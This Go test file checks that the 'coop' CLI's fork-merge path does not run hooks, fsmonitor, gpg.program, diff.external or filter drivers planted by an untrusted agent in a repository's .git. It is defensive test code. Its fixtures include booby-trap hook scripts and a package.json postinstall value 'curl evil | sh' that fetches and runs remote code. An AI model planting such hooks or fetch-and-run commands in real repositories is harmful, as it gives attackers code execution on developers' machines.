package cli

import (
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/AndrewDryga/coop/internal/config"
)

// A missing <name> (without --all) is a usage error (exit 2), reported before the dirty-tree /
// non-interactive environment gates — so the user sees the real problem, not "uncommitted changes".
func TestForkMergeRequiresName(t *testing.T) {
	a := &app{cfg: &config.Config{}}
	if code, err := a.forkMerge(nil); code != 2 || err == nil || !strings.Contains(err.Error(), "usage") {
		t.Errorf("forkMerge(nil) = (%d, %v), want (2, usage error)", code, err)
	}
	if code, err := a.forkMerge([]string{"--nope"}); code != 2 || err == nil {
		t.Errorf("forkMerge(--nope) = (%d, %v), want (2, unknown-flag error)", code, err)
	}
}

// trustedSignArgs must read signing config from your GLOBAL git config — so neither a fork nor the
// agent-writable parent repo can point gpg.program at a planted binary — and track gpg.format to
// the matching program key. (`git config --global` ignores -C, writing the GIT_CONFIG_GLOBAL file.)
func TestTrustedSignArgs(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	t.Setenv("GIT_CONFIG_SYSTEM", filepath.Join(t.TempDir(), "nosystem"))
	t.Run("openpgp default ignores a repo-local poison", func(t *testing.T) {
		t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(t.TempDir(), "global"))
		repo := initRepo(t)
		git(t, repo, "config", "--global", "commit.gpgsign", "true")
		git(t, repo, "config", "--global", "user.signingkey", "ABCD1234")
		git(t, repo, "config", "gpg.program", "/tmp/evil") // repo-local: must be ignored
		want := []string{"-c", "commit.gpgsign=true", "-c", "gpg.program=gpg", "-c", "user.signingkey=ABCD1234"}
		if got := trustedSignArgs(); !slices.Equal(got, want) {
			t.Errorf("trustedSignArgs = %v, want %v (gpg.program must come from global, not the repo)", got, want)
		}
	})
	t.Run("ssh format picks gpg.ssh.program", func(t *testing.T) {
		t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(t.TempDir(), "global"))
		repo := initRepo(t)
		git(t, repo, "config", "--global", "commit.gpgsign", "true")
		git(t, repo, "config", "--global", "gpg.format", "ssh")
		git(t, repo, "config", "--global", "user.signingkey", "/k.pub")
		want := []string{"-c", "commit.gpgsign=true", "-c", "gpg.format=ssh", "-c", "gpg.ssh.program=ssh-keygen", "-c", "user.signingkey=/k.pub"}
		if got := trustedSignArgs(); !slices.Equal(got, want) {
			t.Errorf("trustedSignArgs = %v, want %v", got, want)
		}
	})
}

func TestMergeOneNoGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	a := &app{cfg: &config.Config{}} // no COOP_GATE → no box needed

	ws, err := setupFork(repo, "perf")
	if err != nil {
		t.Fatalf("setupFork: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	landed, err := a.mergeOne(repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's file")
	}
}

func TestMergeOneConflictRollsBack(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	a := &app{cfg: &config.Config{}}

	ws, err := setupFork(repo, "a")
	if err != nil {
		t.Fatalf("setupFork: %v", err)
	}
	// Fork and parent edit the same line → a merge conflict.
	if err := os.WriteFile(filepath.Join(ws, "README.md"), []byte("fork-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "commit", "-aqm", "fork edit")
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("parent-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "commit", "-aqm", "parent edit")

	landed, err := a.mergeOne(repo, "", "a", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want (false, error)", landed, err)
	}
	// The conflicted merge must be fully aborted: tree clean, parent content intact.
	if gitDirty(repo) {
		t.Error("working tree left dirty after a conflicted merge")
	}
	if data, _ := os.ReadFile(filepath.Join(repo, "README.md")); string(data) != "parent-version\n" {
		t.Errorf("README.md = %q, want %q", data, "parent-version\n")
	}
}

func TestMergeOnePolicyForce(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	a := &app{cfg: &config.Config{}}
	ws, err := setupFork(repo, "leak")
	if err != nil {
		t.Fatalf("setupFork: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, ".env"), []byte("S=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "leak")

	// Without --force the policy guard blocks the secret-like file.
	if landed, err := a.mergeOne(repo, "", "leak", false); landed || err == nil {
		t.Fatalf("mergeOne(force=false) = (%v, %v), want blocked", landed, err)
	}
	if pathExists(filepath.Join(repo, ".env")) {
		t.Fatal(".env landed despite the policy block")
	}
	// With --force it lands.
	if landed, err := a.mergeOne(repo, "", "leak", true); !landed || err != nil {
		t.Fatalf("mergeOne(force=true) = (%v, %v), want landed", landed, err)
	}
	if !pathExists(filepath.Join(repo, ".env")) {
		t.Error(".env not landed with --force")
	}
}

// plantForkBooby rigs a fork's agent-writable .git/ to run host commands: every git
// hook plus the config knobs that shell out (core.fsmonitor, core.hooksPath, and a
// forced commit.gpgsign with a planted gpg.program). Each writes a line to marker, so
// its existence proves something in the fork executed on the host.
func plantForkBooby(t *testing.T, ws, marker string) {
	t.Helper()
	hooks := filepath.Join(ws, ".git", "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\necho pwned >> " + marker + "\n"
	for _, h := range []string{"pre-rebase", "post-rewrite", "post-checkout", "post-commit", "post-merge"} {
		if err := os.WriteFile(filepath.Join(hooks, h), []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// A standalone script reused for the command-running config knobs (gpg.program
	// must still emit a signature, so it cats stdin after marking).
	evil := filepath.Join(ws, ".git", "evil.sh")
	if err := os.WriteFile(evil, []byte(script+"cat\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "core.hooksPath", hooks)
	git(t, ws, "config", "core.fsmonitor", evil)
	git(t, ws, "config", "commit.gpgsign", "true")
	git(t, ws, "config", "gpg.program", evil)
}

// A fork's .git/ is agent-writable, so the host-side git commands a merge runs in it
// must not execute fork-planted hooks or command-running config.
func TestMergeOneIgnoresForkBooby(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	a := &app{cfg: &config.Config{}}

	ws, err := setupFork(repo, "evil")
	if err != nil {
		t.Fatalf("setupFork: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent on a different file so landing must rebase/replay (which is
	// what fires pre-rebase/post-checkout/post-rewrite) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	marker := filepath.Join(t.TempDir(), "PWNED")
	plantForkBooby(t, ws, marker)

	landed, err := a.mergeOne(repo, "", "evil", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatalf("a fork-controlled git hook/config executed on the host during merge (marker created)")
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's work")
	}
	// Positive control: the trap is live — a genuinely *raw* git command (bypassing coop's now-
	// hardened helpers entirely) fires it, so the clean run above is the hardening working, not a
	// no-op test. (gitDirty itself is hardened now, so it can't be the control any more.)
	_ = exec.Command("git", "-C", ws, "status", "--porcelain").Run() // raw → runs the planted core.fsmonitor
	if !pathExists(marker) {
		t.Fatal("positive control failed: raw fork git did not trigger the booby trap, so the test proves nothing")
	}
}

// A non-interactive `coop fork merge` must refuse without --yes (it lands work and
// deletes the fork), and proceed with it.
func TestForkMergeNonTTYRequiresYes(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	// Force a non-interactive stdin regardless of how the suite is run — a real TTY
	// would send the un-gated path into an interactive prompt and block.
	devnull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer devnull.Close()
	saved := os.Stdin
	os.Stdin = devnull
	defer func() { os.Stdin = saved }()

	repo := initRepo(t)
	a := &app{cfg: &config.Config{RepoOverride: repo}} // no gate → no box
	ws, err := setupFork(repo, "a")
	if err != nil {
		t.Fatalf("setupFork: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "a.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	// Without --yes: refuse, before landing, fork intact.
	if code, err := a.forkMerge([]string{"a"}); err == nil || code == 0 {
		t.Fatalf("forkMerge(no --yes) = (%d, %v), want a refusal", code, err)
	}
	if pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt landed despite the non-interactive refusal")
	}
	if !pathExists(ws) {
		t.Error("fork was removed despite the refusal")
	}

	// With --yes: lands and removes the fork.
	if code, err := a.forkMerge([]string{"a", "--yes"}); err != nil || code != 0 {
		t.Fatalf("forkMerge(--yes) = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt did not land with --yes")
	}
	if pathExists(ws) {
		t.Error("fork not removed after a --yes land")
	}
}

func TestForkMergeQueue(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	a := &app{cfg: &config.Config{}}
	// Two independent forks, each adding a distinct file.
	for _, n := range []string{"a", "b"} {
		ws, err := setupFork(repo, n)
		if err != nil {
			t.Fatalf("setupFork %s: %v", n, err)
		}
		if err := os.WriteFile(filepath.Join(ws, n+".txt"), []byte(n+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, ws, "add", "-A")
		git(t, ws, "commit", "-qm", n)
	}
	if code, err := a.forkMergeAll(repo, "", false, true); err != nil || code != 0 { // yes=true: approve the bulk land
		t.Fatalf("forkMergeAll = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) || !pathExists(filepath.Join(repo, "b.txt")) {
		t.Error("merge queue did not land both forks")
	}
	if got := forkNames(repo); len(got) != 0 {
		t.Errorf("forks remain after the queue closed them: %v", got)
	}
	// Rebasing must keep history linear — no merge commits.
	if merges := gitOut(repo, "rev-list", "--merges", "HEAD"); merges != "" {
		t.Errorf("rebase queue produced merge commits (history not linear):\n%s", merges)
	}
}

// Task (security 1): every host-side git command coop runs against the PARENT repo must be
// hardened too — the parent's .git (config + hooks) is agent-writable on a normal box run, so a
// poisoned knob must not execute host code when coop status/merges/diffs it. Each case fires a
// positive control with genuinely raw git, so a green test means the hardening works, not a dead
// trap. (Forks were already covered by TestMergeOneIgnoresForkBooby; this guards the parent.)
func TestHostGitHardeningOnPoisonedParent(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	markerScript := func(t *testing.T, path, marker string) {
		t.Helper()
		if err := os.WriteFile(path, []byte("#!/bin/sh\necho pwned >> "+marker+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	// (a) a poisoned core.fsmonitor must not fire when coop runs `git status` (gitDirty).
	t.Run("fsmonitor on status", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "core.fsmonitor", evil)
		_ = gitDirty(repo) // hardened — must not run fsmonitor
		if pathExists(marker) {
			t.Fatal("gitDirty ran the parent's core.fsmonitor on the host")
		}
		_ = exec.Command("git", "-C", repo, "status", "--porcelain").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git status did not fire the planted fsmonitor")
		}
	})

	// (b) a planted post-merge hook must not fire through the merge helper (landFork ff's the parent).
	t.Run("post-merge hook on merge", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		hooks := filepath.Join(repo, ".git", "hooks")
		if err := os.MkdirAll(hooks, 0o755); err != nil {
			t.Fatal(err)
		}
		markerScript(t, filepath.Join(hooks, "post-merge"), marker)
		ahead := func(branch string) { // a branch one commit ahead of main, so --ff-only fast-forwards
			git(t, repo, "checkout", "-q", "-b", branch)
			if err := os.WriteFile(filepath.Join(repo, branch+".txt"), []byte("x\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", branch)
			git(t, repo, "checkout", "-q", "main")
		}
		ahead("a1")
		if err := gitRun(repo, "merge", "--ff-only", "a1"); err != nil { // hardened
			t.Fatalf("merge a1: %v", err)
		}
		if pathExists(marker) {
			t.Fatal("the parent's post-merge hook fired through the hardened merge helper")
		}
		ahead("a2")
		_ = exec.Command("git", "-C", repo, "merge", "--ff-only", "a2").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git merge did not fire the planted post-merge hook")
		}
	})

	// (c) a poisoned diff.external must not run when coop diffs the parent.
	t.Run("diff.external on diff", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "diff.external", evil)
		if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("changed\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		_ = gitOut(repo, "diff") // hardened — diff.external blanked
		if pathExists(marker) {
			t.Fatal("gitOut diff ran the parent's diff.external on the host")
		}
		_ = exec.Command("git", "-C", repo, "diff").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git diff did not run the planted diff.external")
		}
	})

	// (d) a poisoned core.fsmonitor must not fire when `coop check-secrets` enumerates files —
	// candidateFiles runs `git ls-files`, which refreshes the index and so executes fsmonitor. The
	// repo's .git is agent-writable, so this is a host-RCE vector if the call isn't hardened.
	t.Run("fsmonitor on check-secrets ls-files", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "core.fsmonitor", evil)
		if _, err := candidateFiles(repo, false); err != nil { // hardened — must not run fsmonitor
			t.Fatalf("candidateFiles: %v", err)
		}
		if pathExists(marker) {
			t.Fatal("candidateFiles ran the parent's core.fsmonitor on the host")
		}
		_ = exec.Command("git", "-C", repo, "ls-files", "--cached", "--others", "--exclude-standard").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git ls-files did not fire the planted fsmonitor")
		}
	})
}

func TestForkMergeAllRefusesWithoutApproval(t *testing.T) {
	repo := initRepo(t)
	// Stage two fork workspaces so forkNames lists them; their mere existence is enough — the
	// approval gate fires before any fetch/land/destroy.
	for _, n := range []string{"a", "b"} {
		if err := os.MkdirAll(forkWorkspace(repo, n), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	a := &app{cfg: &config.Config{}}
	// Non-interactive stdin (go test) with yes=false → approve() returns false → bulk land is a
	// no-op. Without the gate this path would fetch, land, and DELETE every fork unattended.
	code, err := a.forkMergeAll(repo, "", false, false)
	if err != nil || code != 0 {
		t.Fatalf("forkMergeAll = (%d, %v), want (0, nil)", code, err)
	}
	for _, n := range []string{"a", "b"} {
		if !pathExists(forkWorkspace(repo, n)) {
			t.Errorf("fork %s was destroyed without approval", n)
		}
	}
}

func TestInteractionRiskPath(t *testing.T) {
	cases := []struct {
		status, path string
		flagged      bool
	}{
		{"A", ".envrc", true},
		{"M", ".envrc", true}, // a modified .envrc is a vector too
		{"A", "sub/.envrc", true},
		{"A", ".vscode/tasks.json", true},
		{"M", "x/.vscode/tasks.json", true},
		{"A", "Makefile", true},
		{"M", "Makefile", false}, // a modified Makefile is too common to flag
		{"A", "GNUmakefile", true},
		{"A", "src/main.go", false},
		{"A", "tasks.json", false}, // only flagged under .vscode/
		{"D", ".envrc", true},      // status[0]=='D' is filtered by the caller, not here
	}
	for _, c := range cases {
		if got := interactionRiskPath(c.status, c.path) != ""; got != c.flagged {
			t.Errorf("interactionRiskPath(%q, %q) flagged=%v, want %v", c.status, c.path, got, c.flagged)
		}
	}
}

// policyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
// scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
// are advisory). Build the change as a branch so policyScan's `HEAD...ref` diff is exercised.
func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "base package.json")

	// A branch that introduces an .envrc and adds a postinstall script.
	git(t, repo, "checkout", "-q", "-b", "evil")
	if err := os.WriteFile(filepath.Join(repo, ".envrc"), []byte("export X=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "evil")
	git(t, repo, "checkout", "-q", "main")

	w := strings.Join(policyScan(repo, "evil"), "\n")
	if !strings.Contains(w, ".envrc") {
		t.Errorf("policyScan did not flag .envrc:\n%s", w)
	}
	if !strings.Contains(w, "postinstall") {
		t.Errorf("policyScan did not flag the added postinstall script:\n%s", w)
	}

	// A branch that edits package.json benignly (version bump, no new lifecycle script) is not flagged.
	git(t, repo, "checkout", "-q", "-b", "benign", "main")
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","version":"2","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "bump")
	git(t, repo, "checkout", "-q", "main")
	if w := strings.Join(policyScan(repo, "benign"), "\n"); strings.Contains(w, "package.json adds") {
		t.Errorf("a benign package.json edit was wrongly flagged:\n%s", w)
	}
}

func TestForkDriverNeutralizer(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	ws := initRepo(t)
	// A legit clone has no local filter/merge/diff config → nothing to neutralize.
	if got := forkDriverNeutralizer(ws); len(got) != 0 {
		t.Errorf("clean repo should yield no neutralizer flags, got %v", got)
	}
	// Plant all three driver kinds locally (what an agent would do alongside an in-tree .gitattributes).
	git(t, ws, "config", "filter.x.smudge", "/evil")
	git(t, ws, "config", "filter.x.clean", "/evil")
	git(t, ws, "config", "merge.y.driver", "/evil %O %A %B")
	git(t, ws, "config", "diff.z.command", "/evil")
	got := forkDriverNeutralizer(ws)
	if len(got)%2 != 0 {
		t.Fatalf("neutralizer must be -c/value pairs, got odd count: %v", got)
	}
	joined := strings.Join(got, " ")
	for _, want := range []string{
		"filter.x.smudge=", "filter.x.clean=", "filter.x.process=", "filter.x.required=false",
		"merge.y.driver=", "diff.z.command=", "diff.z.textconv=",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("neutralizer missing blank for %q:\n%v", want, got)
		}
	}
}

// A fork's in-tree .gitattributes + a fork-local smudge filter must not run on the land rebase's
// checkout. Includes a positive control (a raw re-checkout fires the smudge) so a green test means
// the neutralizer worked, not that the filter is dead.
func TestMergeNeutralizesForkDrivers(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	a := &app{cfg: &config.Config{}}
	ws, err := setupFork(repo, "drv")
	if err != nil {
		t.Fatalf("setupFork: %v", err)
	}
	marker := filepath.Join(t.TempDir(), "PWNED")
	smudge := "sh -c 'echo pwned >> " + marker + "; cat'"
	if err := os.WriteFile(filepath.Join(ws, ".gitattributes"), []byte("data.txt filter=x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, "data.txt"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "filter.x.smudge", smudge)
	git(t, ws, "config", "filter.x.clean", "cat")
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent so landing must rebase (a checkout) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	// Positive control: a raw re-checkout of data.txt fires the smudge — the trap is live.
	_ = os.Remove(filepath.Join(ws, "data.txt"))
	_ = exec.Command("git", "-C", ws, "checkout", "--", "data.txt").Run()
	if !pathExists(marker) {
		t.Skip("the smudge filter did not fire on this git version — can't prove the neutralizer here")
	}
	_ = os.Remove(marker)

	// The land rebase must NOT fire it.
	landed, err := a.mergeOne(repo, "", "drv", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatal("the fork's smudge filter executed on the host during the land rebase")
	}
}
